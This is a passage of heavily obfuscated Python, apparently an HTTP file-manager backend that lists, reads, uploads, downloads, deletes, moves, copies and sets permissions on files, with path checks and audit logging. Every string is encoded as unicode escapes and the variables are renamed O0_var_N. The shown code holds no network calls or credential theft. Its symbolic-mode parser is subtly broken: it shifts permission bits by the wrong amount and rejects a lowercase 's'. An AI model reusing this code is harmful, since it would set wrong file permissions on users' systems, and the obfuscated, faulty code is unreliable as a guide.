                O0_var_229.append(self._format_info(O0_var_231))
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_229.sort(key=lambda x: (x.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) != codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape'), x.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower()))
        self._audit(codecs.decode('\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), base_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_229)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_229), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_229}

    def get_authority(self, O0_var_232: List[str]) -> dict:
        O0_var_233 = []
        for O0_var_234 in O0_var_232:
            try:
                O0_var_235 = self._safe_path(O0_var_234)
                if not O0_var_235.exists():
                    O0_var_233.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_234, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_236 = self._format_info(O0_var_235)
                O0_var_233.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_236[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_236[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_236.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape')), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_236.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape')), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_236.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')), codecs.decode('\\u0072\\u0065\\u0061\\u0064\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_235, os.R_OK), codecs.decode('\\u0077\\u0072\\u0069\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_235, os.W_OK), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_235, os.X_OK)})
            except HTTPException as e:
                O0_var_233.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_234, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_233.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_234, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        self._audit(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), str(O0_var_232), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0069\\u0065\\u0064', 'unicode_escape'): len(O0_var_232)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_233}

    def cat_file(self, file_path: str, O0_var_237: int=1048576) -> dict:
        O0_var_238 = self._safe_path(file_path)
        if not O0_var_238.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_238.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if O0_var_238.stat().st_size > O0_var_237:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u0020\\u0066\\u006f\\u0072\\u0020\\u0063\\u0061\\u0074\\u0020\\u0028\\u003e\\u0031\\u004d\\u0042\\u0029\\u003a\\u0020', 'unicode_escape') + str(file_path))
        try:
            O0_var_239 = O0_var_238.read_text(encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
            O0_var_240 = codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')
            O0_var_241 = False
        except:
            O0_var_239 = base64.b64encode(O0_var_238.read_bytes()).decode()
            O0_var_240 = codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')
            O0_var_241 = True
        self._audit(codecs.decode('\\u0063\\u0061\\u0074', 'unicode_escape'), file_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_238.stat().st_size, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_240})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_238.relative_to(self.O0_fn_56)), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): O0_var_239, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_240, codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): O0_var_241, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_238.stat().st_size}

    def upload_file(self, file_content: bytes, target_path: str, filename: str=None, chunk_id: int=None, total_chunks: int=None) -> dict:
        O0_var_242 = self._safe_path(target_path)
        if O0_var_242.is_dir():
            if not filename:
                raise HTTPException(400, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u006e\\u0061\\u006d\\u0065\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
            O0_var_242 = O0_var_242 / filename
        if len(file_content) > self.max_upload and chunk_id is None:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u003a\\u0020\\u0075\\u0073\\u0065\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
        try:
            O0_var_242.parent.mkdir(parents=True, exist_ok=True)
            if chunk_id is not None and total_chunks is not None:
                O0_var_243 = hashlib.md5(O0_var_242.as_posix().encode()).hexdigest()
                self.chunk_dir.mkdir(parents=True, exist_ok=True)
                O0_var_244 = self.chunk_dir / (str(O0_var_243) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(chunk_id))
                with open(O0_var_244, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_245:
                    O0_var_245.write(file_content)
                O0_var_246 = list(self.chunk_dir.glob(str(O0_var_243) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e\\u002a', 'unicode_escape')))
                if len(O0_var_246) == total_chunks:
                    O0_var_247 = self.chunk_dir / (str(O0_var_243) + codecs.decode('\\u002e\\u006c\\u006f\\u0063\\u006b', 'unicode_escape'))
                    try:
                        with open(O0_var_247, codecs.decode('\\u0078', 'unicode_escape')):
                            pass
                    except FileExistsError:
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_246), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks, codecs.decode('\\u006d\\u0073\\u0067', 'unicode_escape'): codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0069\\u006e\\u0067\\u0020\\u0069\\u006e\\u0020\\u0070\\u0072\\u006f\\u0067\\u0072\\u0065\\u0073\\u0073', 'unicode_escape')}
                    try:
                        with open(O0_var_242, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_248:
                            for O0_var_249 in range(total_chunks):
                                O0_var_250 = self.chunk_dir / (str(O0_var_243) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(O0_var_249))
                                with open(O0_var_250, codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_251:
                                    O0_var_248.write(O0_var_251.read())
                                O0_var_250.unlink()
                        self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'), str(O0_var_242), codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'): total_chunks, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_242.stat().st_size})
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_242.relative_to(self.O0_fn_56)), codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): True}
                    finally:
                        if O0_var_247.exists():
                            O0_var_247.unlink()
                else:
                    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_246), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks}
            else:
                with open(O0_var_242, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_245:
                    O0_var_245.write(file_content)
                self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_242), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): len(file_content)})
                return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_242.relative_to(self.O0_fn_56))}
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(500, codecs.decode('\\u0055\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))

    def download_file(self, file_path: str) -> tuple:
        O0_var_252 = self._safe_path(file_path)
        if not O0_var_252.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_252.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        O0_var_253, O0_var_254 = mimetypes.guess_type(str(O0_var_252))
        self._audit(codecs.decode('\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_252), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_252.stat().st_size})
        return (O0_var_252, O0_var_253 or codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006f\\u0063\\u0074\\u0065\\u0074\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'), O0_var_252.stat().st_size)

    def delete_paths(self, O0_var_255: List[str]) -> dict:
        O0_var_256 = []
        for O0_var_257 in O0_var_255:
            try:
                O0_var_258 = self._safe_path(O0_var_257)
                if not O0_var_258.exists():
                    O0_var_256.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_257, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_258.is_dir():
                    shutil.rmtree(O0_var_258)
                else:
                    O0_var_258.unlink()
                O0_var_256.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_257, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape')})
                self._audit(codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065', 'unicode_escape'), O0_var_257, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_256.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_257, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_256.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_257, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_256}

    def move_paths(self, O0_var_259: Dict[str, str]) -> dict:
        O0_var_260 = []
        for O0_var_261, O0_var_262 in O0_var_259.items():
            try:
                O0_var_263 = self._safe_path(O0_var_261)
                O0_var_264 = self._safe_path(O0_var_262)
                if not O0_var_263.exists():
                    O0_var_260.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_261, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_262, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_264.exists():
                    O0_var_260.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_261, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_262, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                O0_var_264.parent.mkdir(parents=True, exist_ok=True)
                shutil.move(str(O0_var_263), str(O0_var_264))
                O0_var_260.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_263.relative_to(self.O0_fn_56)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_264.relative_to(self.O0_fn_56)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_261) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_262), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_260.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_261, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_262, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_260.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_261, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_262, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_265 = sum((1 for O0_var_266 in O0_var_260 if O0_var_266[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_259.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_259), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_265})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_265 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_259), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_265, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_260}

    def copy_paths(self, O0_var_267: Dict[str, str]) -> dict:
        O0_var_268 = []
        for O0_var_269, O0_var_270 in O0_var_267.items():
            try:
                O0_var_271 = self._safe_path(O0_var_269)
                O0_var_272 = self._safe_path(O0_var_270)
                if not O0_var_271.exists():
                    O0_var_268.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_269, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_270, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_272.is_dir():
                    O0_var_272 = O0_var_272 / O0_var_271.name
                if O0_var_272.exists():
                    O0_var_268.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_269, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_270, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                O0_var_272.parent.mkdir(parents=True, exist_ok=True)
                if O0_var_271.is_file():
                    shutil.copy2(str(O0_var_271), str(O0_var_272))
                else:
                    shutil.copytree(str(O0_var_271), str(O0_var_272))
                O0_var_268.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_271.relative_to(self.O0_fn_56)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_272.relative_to(self.O0_fn_56)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_269) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_270), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_268.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_269, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_270, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_268.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_269, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_270, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_273 = sum((1 for O0_var_274 in O0_var_268 if O0_var_274[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        self._audit(codecs.decode('\\u0063\\u006f\\u0070\\u0079\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_267.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_267), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_273})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_273 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_267), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_273, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_268}

    def _parse_mode(self, O0_var_275: str) -> int:
        O0_var_275 = O0_var_275.strip()
        if O0_var_275.isdigit() or (O0_var_275.startswith(codecs.decode('\\u0030', 'unicode_escape')) and O0_var_275[1:].isdigit()):
            return int(O0_var_275, 8)
        if len(O0_var_275) == 9 and all((O0_var_276 in codecs.decode('\\u0072\\u0077\\u0078\\u0053\\u0074\\u0054\\u002d', 'unicode_escape') for O0_var_276 in O0_var_275)):
            O0_var_277 = 0
            O0_var_278 = {codecs.decode('\\u0072', 'unicode_escape'): 4, codecs.decode('\\u0077', 'unicode_escape'): 2, codecs.decode('\\u0078', 'unicode_escape'): 1, codecs.decode('\\u0053', 'unicode_escape'): 0, codecs.decode('\\u0073', 'unicode_escape'): 1, codecs.decode('\\u0054', 'unicode_escape'): 0, codecs.decode('\\u0074', 'unicode_escape'): 1, codecs.decode('\\u002d', 'unicode_escape'): 0}
            for O0_var_279, O0_var_280 in enumerate(O0_var_275):
                if O0_var_280 in O0_var_278:
                    O0_var_281 = 2 - O0_var_279 % 3
                    O0_var_277 |= O0_var_278[O0_var_280] << 6 - O0_var_279 // 3 * 3 + O0_var_281
            return O0_var_277
        if any((O0_var_282 in O0_var_275 for O0_var_282 in [codecs.decode('\\u003d', 'unicode_escape'), codecs.decode('\\u002b', 'unicode_escape'), codecs.decode('\\u002d', 'unicode_escape')])) and any((O0_var_283 in O0_var_275 for O0_var_283 in [codecs.decode('\\u0075', 'unicode_escape'), codecs.decode('\\u0067', 'unicode_escape'), codecs.decode('\\u006f', 'unicode_escape'), codecs.decode('\\u0061', 'unicode_escape')])):
            raise ValueError(codecs.decode('\\u0053\\u0079\\u006d\\u0062\\u006f\\u006c\\u0069\\u0063\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0027', 'unicode_escape') + str(O0_var_275) + codecs.decode('\\u0027\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u0075\\u006c\\u006c\\u0079\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0079\\u0065\\u0074\\u002c\\u0020\\u0075\\u0073\\u0065\\u0020\\u006f\\u0063\\u0074\\u0061\\u006c\\u0020\\u006c\\u0069\\u006b\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027', 'unicode_escape'))
        raise ValueError(codecs.decode('\\u0049\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u006d\\u006f\\u0064\\u0065\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_275) + codecs.decode('\\u0027\\u002e\\u0020\\u0055\\u0073\\u0065\\u0020\\u0027\\u0037\\u0035\\u0035\\u0027\\u002c\\u0020\\u0027\\u0030\\u0036\\u0034\\u0034\\u0027\\u002c\\u0020\\u006f\\u0072\\u0020\\u0027\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u0027', 'unicode_escape'))

    def set_authority(self, O0_var_284: Dict[str, str], recursive: bool=False) -> dict:
        O0_var_285 = []
        for O0_var_286, O0_var_287 in O0_var_284.items():
            try:
                O0_var_288 = self._safe_path(O0_var_286)
                if not O0_var_288.exists():
